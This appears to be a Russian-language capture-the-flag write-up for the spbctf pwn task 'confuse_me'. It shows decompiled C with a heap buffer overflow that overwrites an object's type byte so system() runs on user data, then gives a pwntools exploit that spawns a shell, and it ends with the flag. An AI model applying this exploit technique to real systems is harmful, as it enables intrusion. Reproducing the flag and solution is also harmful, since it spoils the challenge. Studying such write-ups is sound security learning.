[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn8_confuse_me)
Описание:
pwn this simple helper...
`nc 109.233.56.90 11720`
**[confuse_me.elf](https://pwn.spbctf.ru/files/uaf/confuse_me/confuse_me.elf)**

Декомпиляция:
``` C
void __fastcall main(int argc, const char **argv, const char **envp)
{
  action *action; // rax

  setvbuf(stdout, nullptr, 2, 0);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stderr, nullptr, 2, 0);
  action = actions;
  do
    *action++ = -1;
  while ( action != &actions[32] );
  logic_part_0();
}

unsigned __int64 logic_part_0()
{
  int choice; // [rsp+0h] [rbp-28h] BYREF
  unsigned int index; // [rsp+4h] [rbp-24h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-20h]

  v3 = __readfsqword(0x28u);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("Choose:\n\t1 - create action\n\t2 - remove action\n\t3 - execute action");
        __isoc99_scanf("%d", &choice);
        getc(stdin);
        if ( choice != 2 )
          break;
        __printf_chk(1, "Enter index: ");
        __isoc99_scanf("%d", &index);
        getc(stdin);
        if ( index <= 31 )
          actions[index].type = -1;
      }
      if ( choice != 3 )
        break;
      execute_action();
    }
    if ( choice != 1 )
      break;
    create_action();
  }
  puts("ok, bye...");
  return __readfsqword(0x28u) ^ v3;
}

unsigned __int64 create_action()
{
  int index; // ebx
  action *i; // rax
  __int64 v2; // rbx
  char *data; // r12
  int type; // [rsp+4h] [rbp-34h] BYREF
  unsigned __int64 v6; // [rsp+8h] [rbp-30h]

  index = 0;
  v6 = __readfsqword(0x28u);

  for ( i = actions; i->type != -1; ++i )
  {
    if ( ++index == 32 )
    {
      puts("No available actions!");
      return __readfsqword(0x28u) ^ v6;
    }
  }


  puts("Choose type:\n\t1 - calc string length\n\t2 - convert number to hex");
  __isoc99_scanf("%d", &type);
  getc(stdin);
  if ( type == 1 )
  {
    __printf_chk(1, "Enter your string: ");
    data = actions[index].data;
    while ( read(0, data, 1u) + 1 > 1 && *data != 10 )
    {
      if ( ++data == actions[index + 1].data )
      {
        actions[index].type = 1;
        return __readfsqword(0x28u) ^ v6;
      }
    }
    *data = 0;
    actions[index].type = 1;
  }
  else if ( type == 2 )
  {
    __printf_chk(1, "Enter your number: ");
    v2 = index << 8;
    __isoc99_scanf("%d", &actions[0].data[v2]);
    getc(stdin);
    *(&actions[0].type + v2) = 2;
  }
  else
  {
    puts("unknown action!");
  }
  return __readfsqword(0x28u) ^ v6;
}

unsigned __int64 execute_action()
{
  __int64 index_1; // rax
  char type; // dl
  int len; // eax
  signed int index; // [rsp+4h] [rbp-14h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-10h]

  v5 = __readfsqword(0x28u);
  __printf_chk(1, "Enter index: ");
  __isoc99_scanf("%d", &index);
  getc(stdin);


  if ( index <= 31 )
  {
    index_1 = index << 8;
    type = *(&actions[0].type + index_1);
    if ( type == 1 )
    {
      len = strlen(&actions[0].data[index_1]);
      __printf_chk(1, "len = %d\n", len);
    }
    else if ( type == 2 )
    {
      __printf_chk(1, "hex = %x\n", *actions[index].data);
    }
    else if ( type )
    {
      puts("Can't do that...");
    }
    else
    {
      system(&actions[0].data[index_1]);
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

Для удобного чтения кода создал такую структуру:
``` C
00000000 struct __fixed(0x100) action
00000000 {
00000000     char type;
00000001     char data[255];
00000100 };
```

Чтобы получить флаг необходимо вызвать `execute_action()` от объекта с типом 0. Имеется уязвимость переполнения буфера в `create_action()`, через него можно переполнить буфер на куче и переписать тип следующего за ним объекта.
План атаки:
1. Создать первый объект.
2. Создать второй объект с текстом `sh` (вызов шела).
3. Удалить первый объект.
4. Создать объект заново, переполнить буфер, а на конце поставить нуль-байт, чтобы тип следующего за ним объекта был = 0.
5. Вызвать `execute_action()` от объекта с индексом 1.

Эксплоит:
``` python
io = start()

io.sendline(b'1')
io.sendline(b'1')
io.sendlineafter(b': ', b'str')

io.sendline(b'1')
io.sendline(b'1')
io.sendlineafter(b': ', b'sh')

io.sendline(b'2')
io.sendlineafter(b': ', b'0')

io.sendline(b'1')
io.sendline(b'1')
payload = b'A' * 255 + b'\x00'
io.sendafter(b': ', payload)

io.sendline(b'3')
io.sendafter(b': ', b'1')

io.interactive()
```

Запуск:
![{4108A3D7-4119-4F85-9430-2C776D1FD99E}](../../../../z.%20Images/{4108A3D7-4119-4F85-9430-2C776D1FD99E}.png)

Ответ: `spbctf{0e5d8116b10f9a539d7ed75b49921b1ea29dd1fe}`